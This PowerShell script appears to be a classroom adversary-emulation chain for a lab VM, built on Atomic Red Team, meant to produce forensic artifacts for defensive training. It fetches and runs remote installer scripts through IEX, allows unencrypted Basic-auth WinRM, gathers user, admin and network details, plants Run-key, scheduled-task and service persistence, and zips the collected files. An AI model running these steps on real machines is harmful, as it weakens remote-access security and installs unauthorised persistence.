<#
Atomic Red Team Classroom Attack Chain
Run as Administrator on a disposable Windows 10/11 lab VM.
#>

# ==============================
# Administrator Check
# ==============================

$CurrentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($CurrentIdentity)

if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw "Please run this script as Administrator."
}

# ==============================
# Lab Settings
# ==============================

$AtomicRoot = "C:\AtomicRedTeam"
$AtomicsPath = "$AtomicRoot\atomics"

$LabRoot = "C:\Users\Public\Documents\fsociety-lab"
$StageDir = "$LabRoot\stage"
$LogFile = "$LabRoot\attack-chain-log.txt"
$PayloadName = "fsociety_update.ps1"
$PayloadPath = "$LabRoot\$PayloadName"
$ZipPath = "$LabRoot\fsociety_exfil_stage.zip"
$RunKeyName = "FSocietyUpdater"
$TaskName = "FSociety Daily Update"
$ServiceName = "FSocietyUpdaterSvc"

New-Item -ItemType Directory -Path $LabRoot -Force | Out-Null
New-Item -ItemType Directory -Path $StageDir -Force | Out-Null

Start-Transcript -Path $LogFile -Append

# ==============================
# Install Prerequisites
# ==============================

Write-Host "`n[+] Installing prerequisites..." -ForegroundColor Yellow

Set-ExecutionPolicy Bypass -Scope Process -Force
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (-not (Get-PackageProvider -Name NuGet -ErrorAction SilentlyContinue)) {
    Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
}

Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue

$RequiredModules = @(
    "PowerShellGet",
    "PackageManagement",
    "powershell-yaml",
    "Invoke-AtomicRedTeam"
)

foreach ($Module in $RequiredModules) {
    if (-not (Get-Module -ListAvailable -Name $Module)) {
        Write-Host "[+] Installing module: $Module" -ForegroundColor Yellow
        Install-Module -Name $Module -Scope CurrentUser -Force -AllowClobber
    }
}

Import-Module PowerShellGet -Force
Import-Module PackageManagement -Force
Import-Module powershell-yaml -Force
Import-Module Invoke-AtomicRedTeam -Force

# ==============================
# Enable PowerShell Remoting / WinRM
# ==============================

Write-Host "`n[+] Enabling PowerShell Remoting..." -ForegroundColor Yellow

try {
    Enable-PSRemoting -Force -SkipNetworkProfileCheck

    Set-Service WinRM -StartupType Automatic
    Start-Service WinRM

    winrm quickconfig -quiet

    Enable-NetFirewallRule -DisplayGroup "Windows Remote Management" -ErrorAction SilentlyContinue

    Set-Item WSMan:\localhost\Service\AllowUnencrypted $true -Force
    Set-Item WSMan:\localhost\Service\Auth\Basic $true -Force

    Write-Host "[+] PowerShell Remoting enabled successfully." -ForegroundColor Green
}
catch {
    Write-Host "[!] Failed to fully enable PowerShell Remoting: $($_.Exception.Message)" -ForegroundColor Red
}

# ==============================
# Install Atomic Red Team
# ==============================

Write-Host "`n[+] Checking Atomic Red Team..." -ForegroundColor Yellow

if (-not (Test-Path $AtomicRoot)) {
    New-Item -ItemType Directory -Path $AtomicRoot -Force | Out-Null
}

try {
    IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
    IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicsfolder.ps1' -UseBasicParsing)

    Install-AtomicRedTeam -InstallPath $AtomicRoot -Force
    Install-AtomicsFolder -InstallPath $AtomicRoot -Force
}
catch {
    Write-Host "[!] Atomic installer method failed: $($_.Exception.Message)" -ForegroundColor Red
}

$PossibleAtomicsPaths = @(
    "C:\AtomicRedTeam\atomics",
    "$env:USERPROFILE\AtomicRedTeam\atomics",
    "$env:USERPROFILE\Documents\AtomicRedTeam\atomics"
)

$DetectedAtomicsPath = $PossibleAtomicsPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($DetectedAtomicsPath) {
    $AtomicsPath = $DetectedAtomicsPath
    Write-Host "[+] Atomics folder found at: $AtomicsPath" -ForegroundColor Green
}
else {
    Write-Host "[!] Atomics folder not found. Downloading manually from GitHub..." -ForegroundColor Yellow

    try {
        $ZipUrl = "https://github.com/redcanaryco/atomic-red-team/archive/refs/heads/master.zip"
        $ZipFile = "$env:TEMP\atomic-red-team-master.zip"
        $ExtractPath = "$env:TEMP\atomic-red-team-master"

        Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipFile -UseBasicParsing

        if (Test-Path $ExtractPath) {
            Remove-Item $ExtractPath -Recurse -Force
        }

        Expand-Archive -Path $ZipFile -DestinationPath $ExtractPath -Force

        $ManualAtomics = Get-ChildItem -Path $ExtractPath -Directory -Recurse |
            Where-Object { $_.Name -eq "atomics" } |
            Select-Object -First 1

        if ($ManualAtomics) {
            if (Test-Path $AtomicsPath) {
                Remove-Item $AtomicsPath -Recurse -Force
            }

            Copy-Item -Path $ManualAtomics.FullName -Destination $AtomicsPath -Recurse -Force
            Write-Host "[+] Manually copied atomics folder to: $AtomicsPath" -ForegroundColor Green
        }
        else {
            Write-Host "[!] Could not locate atomics folder. Script will continue without running atomics." -ForegroundColor Red
            $AtomicsPath = $null
        }
    }
    catch {
        Write-Host "[!] Manual atomics download failed: $($_.Exception.Message)" -ForegroundColor Red
        $AtomicsPath = $null
    }
}

# ==============================
# Helper Function
# ==============================

function Invoke-ClassroomAtomic {
    param(
        [string]$Technique,
        [string]$Description
    )

    Write-Host "`n[+] Running Atomic: $Technique - $Description" -ForegroundColor Cyan

    if (-not $AtomicsPath -or -not (Test-Path $AtomicsPath)) {
        Write-Host "[!] Atomics folder unavailable. Skipping $Technique but continuing script." -ForegroundColor Yellow
        return
    }

    try {
        Invoke-AtomicTest $Technique -GetPrereqs -PathToAtomicsFolder $AtomicsPath
        Invoke-AtomicTest $Technique -PathToAtomicsFolder $AtomicsPath
    }
    catch {
        Write-Host "[!] Atomic $Technique failed, but script will continue: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ==============================
# Phase 1: Initial Execution
# ==============================

Write-Host "`n[+] Phase 1: Initial Execution" -ForegroundColor Magenta

$PayloadContent = @"
Write-Output 'FSociety classroom payload executed'
whoami | Out-File '$StageDir\whoami.txt'
hostname | Out-File '$StageDir\hostname.txt'
ipconfig /all | Out-File '$StageDir\ipconfig.txt'
systeminfo | Out-File '$StageDir\systeminfo.txt'
net user | Out-File '$StageDir\net-user.txt'
net localgroup administrators | Out-File '$StageDir\local-admins.txt'
"@

Set-Content -Path $PayloadPath -Value $PayloadContent

powershell.exe -ExecutionPolicy Bypass -File $PayloadPath

Invoke-ClassroomAtomic -Technique "T1059.001" -Description "PowerShell Execution"

# ==============================
# Phase 2: Discovery
# ==============================

Write-Host "`n[+] Phase 2: Discovery" -ForegroundColor Magenta

Invoke-ClassroomAtomic -Technique "T1033" -Description "System Owner/User Discovery"
Invoke-ClassroomAtomic -Technique "T1082" -Description "System Information Discovery"
Invoke-ClassroomAtomic -Technique "T1016" -Description "System Network Configuration Discovery"

whoami /all | Out-File "$StageDir\whoami-all.txt"
tasklist /v | Out-File "$StageDir\tasklist.txt"
netstat -ano | Out-File "$StageDir\netstat.txt"
arp -a | Out-File "$StageDir\arp.txt"
route print | Out-File "$StageDir\route.txt"

# ==============================
# Phase 3: Persistence Artifacts
# ==============================

Write-Host "`n[+] Phase 3: Persistence Artifacts" -ForegroundColor Magenta

New-ItemProperty `
    -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name $RunKeyName `
    -Value "powershell.exe -ExecutionPolicy Bypass -File `"$PayloadPath`"" `
    -PropertyType String `
    -Force | Out-Null

schtasks /Create /TN $TaskName /SC DAILY /ST 09:00 /TR "powershell.exe -ExecutionPolicy Bypass -File `"$PayloadPath`"" /F

sc.exe create $ServiceName binPath= "powershell.exe -ExecutionPolicy Bypass -File `"$PayloadPath`"" start= demand
sc.exe description $ServiceName "Classroom forensic artifact service for Atomic Red Team lab"

Invoke-ClassroomAtomic -Technique "T1053.005" -Description "Scheduled Task"
Invoke-ClassroomAtomic -Technique "T1547.001" -Description "Registry Run Key"
Invoke-ClassroomAtomic -Technique "T1543.003" -Description "Windows Service"

# ==============================
# Phase 4: File System Artifacts
# ==============================

Write-Host "`n[+] Phase 4: File Creation, Modification, and Deletion" -ForegroundColor Magenta

"Sensitive project notes - classroom artifact" | Out-File "$StageDir\elliot-project-notes.txt"
"Browser credential collection simulation - no real credential theft" | Out-File "$StageDir\browser-artifact-simulation.txt"
"Temporary malware dropper simulation" | Out-File "$LabRoot\fsociety_dropper.tmp"

Start-Sleep -Seconds 2

Remove-Item "$LabRoot\fsociety_dropper.tmp" -Force

notepad.exe "$StageDir\elliot-project-notes.txt"
Start-Sleep -Seconds 3
Get-Process notepad -ErrorAction SilentlyContinue | Stop-Process -Force

calc.exe
Start-Sleep -Seconds 3
Get-Process CalculatorApp -ErrorAction SilentlyContinue | Stop-Process -Force

# ==============================
# Phase 5: Browser and Network Artifacts
# ==============================

Write-Host "`n[+] Phase 5: Browser and Network Artifacts" -ForegroundColor Magenta

Start-Process "msedge.exe" "https://example.com/fsociety-training"
Start-Sleep -Seconds 5
Get-Process msedge -ErrorAction SilentlyContinue | Stop-Process -Force

nslookup example.com | Out-File "$StageDir\dns-example.txt"
ping example.com -n 2 | Out-File "$StageDir\ping-example.txt"

try {
    Invoke-WebRequest `
        -Uri "https://example.com" `
        -OutFile "$StageDir\downloaded-example.html" `
        -UseBasicParsing
}
catch {
    Write-Host "[!] Web request failed, continuing: $($_.Exception.Message)" -ForegroundColor Yellow
}

Invoke-ClassroomAtomic -Technique "T1105" -Description "Ingress Tool Transfer / Download Simulation"

# ==============================
# Phase 6: Collection and Staging
# ==============================

Write-Host "`n[+] Phase 6: Collection and Exfiltration Staging Simulation" -ForegroundColor Magenta

Get-ChildItem $StageDir -Recurse | Out-File "$StageDir\staged-file-list.txt"

Compress-Archive -Path "$StageDir\*" -DestinationPath $ZipPath -Force

Invoke-ClassroomAtomic -Technique "T1560.001" -Description "Archive Collected Data"

# ==============================
# Finished
# ==============================

Write-Host "`n[+] Attack chain complete." -ForegroundColor Green
Write-Host "[+] Lab artifacts created in: $LabRoot" -ForegroundColor Green
Write-Host "[+] Staged archive: $ZipPath" -ForegroundColor Green
Write-Host "[+] Transcript saved to: $LogFile" -ForegroundColor Green

Stop-Transcript